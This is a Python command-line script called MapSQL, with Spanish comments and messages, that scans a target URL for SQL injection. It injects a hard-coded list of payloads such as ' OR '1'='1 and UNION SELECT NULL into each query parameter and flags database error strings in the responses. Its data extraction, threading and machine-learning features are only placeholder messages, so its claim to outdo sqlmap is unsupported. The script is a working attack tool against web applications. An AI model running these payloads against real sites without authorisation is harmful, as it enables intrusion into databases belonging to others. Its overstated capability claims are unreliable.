#!/usr/bin/env python3
"""
MapSQL - La herramienta más potente que sqlmap
Autor: Falconmx1
GitHub: https://github.com/Falconmx1/MapSQL
"""

import argparse
import sys
import threading
import requests
from urllib.parse import urlparse, urljoin
import time
import json

# Banner
BANNER = """
\033[91m
 ███▄    █  ▄▄▄       ██▓███    ██████   █████  ██▓    
 ██ ▀█   █ ▒████▄    ▓██░  ██▒▒██    ▒ ▓█   ▀ ▓██▒    
▓██  ▀█ ██▒▒██  ▀█▄  ▓██░ ██▓▒░ ▓██▄   ▒███   ▒██░    
▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒  ▒   ██▒▒▓█  ▄ ▒██░    
▒██░   ▓██░ ▓█   ▓██▒▒██▒ ░  ░▒██████▒▒░▒████▒░██████▒
░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░
░ ░░   ░ ▒░  ▒   ▒▒ ░░▒ ░     ░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░
   ░   ░ ░   ░   ▒   ░░       ░  ░  ░     ░     ░ ░   
         ░       ░  ░               ░     ░  ░    ░  ░
\033[0m
\033[93m[+] MapSQL v1.0 - El cazador de bases de datos definitivo\033[0m
\033[90m[+] GitHub: https://github.com/Falconmx1/MapSQL\033[0m\n
"""

# Payloads básicos para pruebas
PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
]

class MapSQL:
    def __init__(self, target, threads=5, ml=False):
        self.target = target
        self.threads = threads
        self.ml = ml
        self.vulnerable = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_injection(self, param, value):
        """Prueba un payload específico en un parámetro"""
        parsed = urlparse(self.target)
        params = dict(x.split('=') for x in parsed.query.split('&')) if parsed.query else {}
        params[param] = value
        
        try:
            response = self.session.get(self.target, params=params, timeout=5)
            return response.text, response.status_code
        except:
            return "", 0
    
    def detect_sqli(self):
        """Detección de SQLi con múltiples payloads"""
        print("\033[96m[*] Iniciando detección de SQL Injection...\033[0m")
        
        parsed = urlparse(self.target)
        if not parsed.query:
            print("\033[91m[-] No se encontraron parámetros en la URL\033[0m")
            return False
        
        params = [p.split('=')[0] for p in parsed.query.split('&')]
        print(f"\033[90m[*] Parámetros detectados: {', '.join(params)}\033[0m")
        
        for param in params:
            print(f"\n\033[94m[>] Probando parámetro: {param}\033[0m")
            
            for payload in PAYLOADS:
                print(f"    - Enviando: {payload[:30]}...", end=' ')
                response, status = self.test_injection(param, payload)
                
                # Detección básica de errores SQL
                sql_errors = [
                    "mysql", "sql syntax", "ora-", "postgresql",
                    "microsoft access", "sqlite", "unclosed quotation mark"
                ]
                
                if any(error in response.lower() for error in sql_errors):
                    print("\033[91m¡POSIBLE SQLi DETECTADA!\033[0m")
                    self.vulnerable = True
                    print(f"\033[93m[!] Payload vulnerable: {payload}\033[0m")
                    break
                else:
                    print("\033[90mno vulnerable\033[0m")
            
            if self.vulnerable:
                break
        
        return self.vulnerable
    
    def extract_data(self):
        """Extracción básica de datos (simulada por ahora)"""
        if not self.vulnerable:
            print("\033[91m[-] No se encontraron vulnerabilidades SQLi\033[0m")
            return
        
        print("\n\033[92m[+] Vulnerabilidad confirmada. Iniciando extracción...\033[0m")
        print("\033[93m[!] Versión completa: Próximamente con multi-threading y ML\033[0m")
        print("\033[90m[*] Prueba la versión avanzada en: https://github.com/Falconmx1/MapSQL\033[0m")
    
    def run(self):
        """Ejecutar escaneo completo"""
        print(BANNER)
        print(f"\033[90m[*] Target: {self.target}\033[0m")
        print(f"\033[90m[*] Threads: {self.threads}\033[0m")
        print(f"\033[90m[*] ML Mode: {self.ml}\033[0m\n")
        
        if self.detect_sqli():
            self.extract_data()
        else:
            print("\n\033[92m[+] No se detectaron vulnerabilidades SQLi.\033[0m")

def main():
    parser = argparse.ArgumentParser(description='MapSQL - Herramienta de SQLi avanzada')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo (ej: http://test.com/page?id=1)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Número de hilos (default: 5)')
    parser.add_argument('--ml', action='store_true', help='Activar detección con Machine Learning')
    parser.add_argument('--dbs', action='store_true', help='Enumerar bases de datos')
    
    args = parser.parse_args()
    
    if args.dbs:
        print("\033[93m[!] Funcionalidad --dbs en desarrollo\033[0m")
    
    scanner = MapSQL(args.url, args.threads, args.ml)
    scanner.run()

if __name__ == "__main__":
    main()
